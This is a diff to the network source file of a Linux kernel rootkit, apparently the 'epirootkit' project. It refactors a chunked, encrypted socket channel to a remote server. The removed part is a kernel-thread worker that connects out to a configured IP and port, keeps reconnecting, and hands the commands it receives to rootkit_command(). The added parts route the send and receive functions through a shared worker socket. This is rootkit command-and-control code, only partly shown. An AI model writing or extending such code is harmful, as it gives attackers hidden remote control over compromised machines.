@@ -1,34 +1,9 @@
-#include <linux/delay.h>
-#include <linux/inet.h>
 #include <linux/kernel.h>
-#include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
 #include <linux/socket.h>
 
-#include "epirootkit.h"
-
-struct socket *sock = NULL;
-
-// Functions prototypes
-int close_socket(void);
-int send_to_server_raw(const char *data, size_t len);
-int send_to_server(char *message, ...);
-int network_worker(void *data);
-
-/**
- * @brief Closes the communication by releasing the socket.
- *
- * @return SUCCESS
- */
-int close_socket(void) {
-    if (sock) {
-        sock_release(sock);
-        sock = NULL;
-        DBG_MSG("close_socket: socket released\n");
-    }
-    return SUCCESS;
-}
+#include "network.h"
 
 /**
  * @brief Sends a message to the server.
@@ -53,8 +28,10 @@ int send_to_server(char *message, ...) {
     int needed;
     int ret_code;
 
-    if (!sock)
+    if (!get_worker_socket()) {
+        ERR_MSG("send_to_server: socket is not initialized\n");
         return -EINVAL;
+    }
 
     // Compute required size
     va_start(args, message);
@@ -108,8 +85,17 @@ int send_to_server_raw(const char *data, size_t len) {
 
     // get the number of chunks needed to send the data
     size_t nb_chunks_needed = len / max_chunk_body_size;
-    if (len % max_chunk_body_size != 0)
+    if (len % max_chunk_body_size != 0) {
         nb_chunks_needed++;
+    }
+
+    // retrieve the socket
+    struct socket *sock = get_worker_socket();
+    if (!sock) {
+        ERR_MSG("send_to_server_raw: socket is not initialized\n");
+        kfree(encrypted_msg);
+        return -EINVAL;
+    }
 
     // main loop: send all chunks
     for (size_t i = 0; i < nb_chunks_needed; i++) {
@@ -158,6 +144,14 @@ int receive_from_server(char *buffer, size_t max_len) {
     size_t nb_chunks_needed = 0;
     bool *received_chunks = NULL;
     char *chunk_buffer = NULL;
+
+    // Retrieve the socket
+    struct socket *sock = get_worker_socket();
+    if (!sock) {
+        ERR_MSG("receive_from_server: socket is not initialized\n");
+        kfree(received_buffer);
+        return -EINVAL;
+    }
 
     // This loop waits for and receives the chunks of the message
     while (total_received < max_len) {
@@ -325,119 +319,4 @@ out:
     filp_close(file, NULL);
     kfree(buffer);
     return ret_code;
-}
-
-static int connect_to_server(struct socket **sock, struct sockaddr_in *addr) {
-    int ret;
-    struct socket *s;
-
-    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &s);
-    if (ret < 0) {
-        ERR_MSG("network_worker: socket creation failed: %d\n", ret);
-        return -FAILURE;
-    }
-
-    ret = s->ops->connect(s, (struct sockaddr *)addr, sizeof(*addr), 0);
-    if (ret < 0) {
-        ERR_MSG("network_worker: connection to server failed: %d\n", ret);
-        sock_release(s);
-        return -FAILURE;
-    }
-
-    *sock = s;
-    return SUCCESS;
-}
-
-static bool send_initial_message_with_retries(void) {
-    for (int attempts = 0; attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR; attempts++) {
-        if (send_to_server(message) == SUCCESS)
-            return true;
-        msleep(TIMEOUT_BEFORE_RETRY);
-    }
-    return false;
-}
-
-static bool receive_loop(char *recv_buffer) {
-    unsigned failure_count = 0, empty_count = 0;
-
-    while (!kthread_should_stop()) {
-		// Clear the buffer before receiving
-		memset(recv_buffer, 0, RCV_CMD_BUFFER_SIZE);
-
-        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == -FAILURE) {
-            if (++failure_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
-                return false;
-            msleep(TIMEOUT_BEFORE_RETRY);
-            continue;
-        }
-
-        if (recv_buffer[0] == '\0') {
-            if (++empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
-                return false;
-            continue;
-        }
-
-        failure_count = empty_count = 0;
-
-		// print the received message
-		DBG_MSG("network_worker: received message: %s\n", recv_buffer);
-
-        if (strcmp(recv_buffer, "\n") != 0)
-            rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
-    }
-
-    return true;
-}
-
-int network_worker(void *data) {
-    char *recv_buffer = NULL;
-    struct sockaddr_in addr = { 0 };
-    unsigned char ip_binary[4] = { 0 };
-
-    if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
-        ERR_MSG("network_worker: invalid IPv4 address\n");
-        return -FAILURE;
-    }
-
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port);
-    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
-
-    while (!kthread_should_stop()) {
-        close_socket();
-
-        if (connect_to_server(&sock, &addr) != SUCCESS) {
-            msleep(TIMEOUT_BEFORE_RETRY);
-            continue;
-        }
-
-        if (!send_initial_message_with_retries()) {
-            msleep(TIMEOUT_BEFORE_RETRY);
-            continue;
-        }
-
-        recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
-        if (!recv_buffer) {
-            ERR_MSG("network_worker: failed to allocate recv_buffer\n");
-            break;
-        }
-
-        if (!receive_loop(recv_buffer)) {
-            kfree(recv_buffer);
-            recv_buffer = NULL;
-			is_auth = false;
-            msleep(TIMEOUT_BEFORE_RETRY);
-            continue;
-        }
-
-        break;
-    }
-
-	if (recv_buffer)
-		kfree(recv_buffer);
-
-    close_socket();
-    thread_exited = true;
-
-    return SUCCESS;
 }
